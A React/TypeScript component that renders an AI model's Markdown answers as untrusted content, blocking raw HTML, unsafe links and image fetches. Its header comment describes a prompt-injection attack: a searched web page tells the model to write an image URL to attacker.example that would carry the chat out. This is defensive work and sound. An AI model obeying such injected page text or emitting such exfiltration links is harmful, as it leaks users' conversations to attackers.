/**
 * An answer, as Markdown, treated as untrusted (workbench-v1.md W5).
 *
 * - No raw HTML: `react-markdown` without `rehype-raw` renders HTML in an
 *   answer as the text it is.
 * - **An image an answer names is shown as a link, never fetched.** A page
 *   the model read in a search can tell it to write
 *   `![](https://attacker.example/?q=<the chat>)`, and rendering that image
 *   would send the chat away. The page's Content Security Policy refuses
 *   the fetch as well; this is the first lock on the same door.
 * - Only http, https and mailto links are links, opened in a new tab with
 *   no opener and no referrer.
 */

import { type ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { CopyButton } from "./CopyButton";

const SAFE = /^(https?:|mailto:)/i;

export function safeHref(href: string | undefined | null): string | null {
  if (!href) return null;
  const trimmed = href.trim();
  return SAFE.test(trimmed) ? trimmed : null;
}

function CodeBlock({ children }: { children: ReactNode }) {
  const text = textOf(children);
  return (
    <div className="relative">
      <div className="flex justify-end rounded-t-plexus border border-b-0 border-line bg-soft px-2 py-1 text-xs text-muted">
        <CopyButton text={text} label="code" />
      </div>
      <pre className="overflow-x-auto rounded-plexus border border-line bg-soft p-3 pr-20 font-mono text-sm">
        {children}
      </pre>
    </div>
  );
}

function textOf(node: ReactNode): string {
  if (node == null || typeof node === "boolean") return "";
  if (typeof node === "string" || typeof node === "number") return String(node);
  if (Array.isArray(node)) return node.map(textOf).join("");
  if (typeof node === "object" && "props" in node) {
    return textOf((node as { props: { children?: ReactNode } }).props.children);
  }
  return "";
}

const components: Components = {
  img({ src, alt }) {
    const href = safeHref(typeof src === "string" ? src : null);
    const label = alt ? `Image: ${alt}` : "Image";
    if (!href) return <span className="text-muted">[{label}]</span>;
    return (
      <a
        href={href}
        target="_blank"
        rel="noopener noreferrer"
        title="Not shown here: open it yourself if you trust it"
      >
        [{label}]
      </a>
    );
  },
  a({ href, children }) {
    const safe = safeHref(href);
    if (!safe) return <span>{children}</span>;
    return (
      <a href={safe} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    );
  },
  pre({ children }) {
    return <CodeBlock>{children}</CodeBlock>;
  },
};

export function Markdown({ text }: { text: string }) {
  return (
    <div className="answer">
      <ReactMarkdown remarkPlugins={[remarkGfm]} components={components} skipHtml>
        {text}
      </ReactMarkdown>
    </div>
  );
}
